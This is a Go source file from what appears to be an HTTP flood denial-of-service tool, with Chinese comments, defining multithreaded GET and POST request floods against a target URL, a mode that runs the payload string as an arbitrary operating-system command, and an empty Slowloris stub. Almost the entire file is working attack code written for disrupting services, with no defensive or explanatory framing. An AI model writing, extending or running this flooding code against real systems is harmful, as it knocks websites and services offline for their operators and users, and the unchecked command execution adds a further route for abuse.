// http.go
package attack

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"os/exec"
)


// HTTP 定义HTTP攻击的配置和统计信息
type HTTP struct {
	Method      string            // 攻击方法：GET, POST
	Target      string            // 目标URL
	Path        string            // 可选路径
	Threads     int               // 攻击线程数
	Header		map[string]string // 额外请求头
	Payload     string            // POST请求负载，也可以用来传输os命令

	// 统计字段
	sentRequests  int64
	recvResponses int64
	sentBytes     int64
	recvBytes     int64
	connErrors    int64
	startTime     time.Time
}

// HTTPStart 开始HTTP攻击
func (h *HTTP) HTTPStart() {
	// 初始化
	h.startTime = time.Now()
	
	// 初始化带宽限制器
	InitBandwidthLimiter()
	
	fmt.Printf("[+] 开始 %s 攻击目标: %s\n", h.Method, h.Target)
	fmt.Printf("[+] 线程数: %d\n", h.Threads)
	if len(h.Header) > 0 {
		fmt.Println("[+] 使用自定义请求头")
	}
	
	// 根据Method选择攻击方式
	switch h.Method {
	case "GET":
		h.floodAttack(h.httpGet)
	case "POST":
		h.floodAttack(h.httpPost)
	case "CURL":
		h.floodAttack(h.curl)
	case "SLOWLORIS":
		h.floodAttack(h.Slowloris)
	default:
		fmt.Printf("不支持的HTTP攻击方法: %s\n", h.Method)
		return
	}

	h.printSummary()
}

// 攻击函数类型
type attackFunc func() error

// floodAttack 执行洪水攻击
func (h *HTTP) floodAttack(attackVector attackFunc) {
	var wg sync.WaitGroup
	
	// 创建错误通道用于聚合错误报告
	errorChan := make(chan error, h.Threads)
	
	// 启动错误监控协程
	go func() {
		for err := range errorChan {
			atomic.AddInt64(&h.connErrors, 1)
			// 错误记录策略：每50个错误记录一次，但确保记录第一个错误
			if h.connErrors <= 1 || h.connErrors%50 == 0 {
				fmt.Printf("HTTP攻击错误: %v (错误计数: %d)\n", err, h.connErrors)
			}
		}
	}()

	for i := 0; i < h.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				select {
				case <-STOP:
					fmt.Printf("线程 %d: HTTP攻击终止\n", id)
					return
				default:
					// 应用带宽限制 - 估算请求大小
					if bandwidthLimiter != nil {
						// 估计请求大小 (基于请求头和负载)
						reqSize := 300 // 基本请求大小估算 (可根据实际情况调整)
						if h.Method == "POST" {
							reqSize += len(h.Payload)
						}
						
						// 等待足够的带宽令牌
						if err := bandwidthLimiter.WaitN(context.Background(), reqSize); err != nil {
							errorChan <- fmt.Errorf("带宽限制等待失败: %v", err)
							time.Sleep(100 * time.Millisecond) // 添加简单的回退策略
							continue
						}
					}
					
					if err := attackVector(); err != nil {
						errorChan <- err
						// 添加简单的指数回退策略
						backoff := time.Duration(50*(atomic.LoadInt64(&h.connErrors)%20)) * time.Millisecond
						if backoff > 2*time.Second {
							backoff = 2 * time.Second // 最大回退时间
						}
						time.Sleep(backoff)
					}
				}
			}
		}(i)
	}
	
	wg.Wait()
	close(errorChan) // 关闭错误通道
}

// httpGet 执行GET请求攻击 - 不等待响应版本
func (h *HTTP) httpGet() error {
	client := h.newClient()

	// 构建请求目标
	reqTarget := h.Target
	if h.Path != "" {
		parsedURL, err := url.Parse(h.Target)
		if err == nil {
			parsedURL.Path = h.Path
			reqTarget = parsedURL.String()
		}
	}

	req, err := http.NewRequest("GET", reqTarget, nil)
	if err != nil {
		return fmt.Errorf("创建GET请求失败: %v", err)
	}

	// 添加请求头
	h.addHeaders(req)

	// 记录发送请求
	atomic.AddInt64(&h.sentRequests, 1)
	reqSize := estimateRequestSize(req)
	atomic.AddInt64(&h.sentBytes, int64(reqSize))

	// 使用goroutine异步发送请求并处理响应
	go func() {
		resp, err := client.Do(req)
		if err != nil {
			// 仅忽略错误，不中断主流程
			return
		}
		
		// 记录接收到响应
		atomic.AddInt64(&h.recvResponses, 1)
		
		// 异步读取并丢弃响应体，但统计大小
		go func() {
			defer resp.Body.Close()
			n, err := io.Copy(io.Discard, resp.Body)
			// 忽略读取错误
			_ = err
			atomic.AddInt64(&h.recvBytes, n)
		}()
	}()

	return nil
}

// httpPost 执行POST请求攻击 - 不等待响应版本
func (h *HTTP) httpPost() error {
	client := h.newClient()

	// 构建请求目标
	reqTarget := h.Target
	if h.Path != "" {
		parsedURL, err := url.Parse(h.Target)
		if err == nil {
			parsedURL.Path = h.Path
			reqTarget = parsedURL.String()
		}
	}

	// 创建请求体
	body := strings.NewReader(h.Payload)
	req, err := http.NewRequest("POST", reqTarget, body)
	if err != nil {
		return fmt.Errorf("创建POST请求失败: %v", err)
	}

	// 添加请求头
	h.addHeaders(req)

	// 确保内容类型正确设置 (如果没有在自定义头部中指定)
	if _, hasContentType := req.Header["Content-Type"]; !hasContentType {
		// 根据payload尝试猜测内容类型
		if strings.HasPrefix(h.Payload, "{") || strings.HasPrefix(h.Payload, "[") {
			req.Header.Set("Content-Type", "application/json")
		} else if strings.Contains(h.Payload, "&") && strings.Contains(h.Payload, "=") {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req.Header.Set("Content-Type", "text/plain")
		}
	}

	// 记录发送请求
	atomic.AddInt64(&h.sentRequests, 1)
	reqSize := estimateRequestSize(req) + len(h.Payload)
	atomic.AddInt64(&h.sentBytes, int64(reqSize))

	// 使用goroutine异步发送请求并处理响应
	go func() {
		resp, err := client.Do(req)
		if err != nil {
			// 仅忽略错误，不中断主流程
			return
		}
		
		// 记录接收到响应
		atomic.AddInt64(&h.recvResponses, 1)
		
		// 异步读取并丢弃响应体，但统计大小
		go func() {
			defer resp.Body.Close()
			n, err := io.Copy(io.Discard, resp.Body)
			// 忽略读取错误
			_ = err
			atomic.AddInt64(&h.recvBytes, n)
		}()
	}()

	return nil
}

// curl执行命令，可以利用curl限速机制
func (h *HTTP) curl() error {
    args := strings.Fields(h.Payload)
    if len(args) == 0 {
        return fmt.Errorf("empty payload")
    }

    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    go func() {
        select {
        case <-STOP:
            cancel() // 收到终止信号时取消上下文
        case <-ctx.Done():
            return
        }
    }()

    cmd := exec.CommandContext(ctx, args[0], args[1:]...) // 绑定上下文
    _ = cmd.Run() // 忽略错误
    return nil
}

// Slowloris 使用慢速攻击策略
func (h *HTTP) Slowloris() error{ return nil}
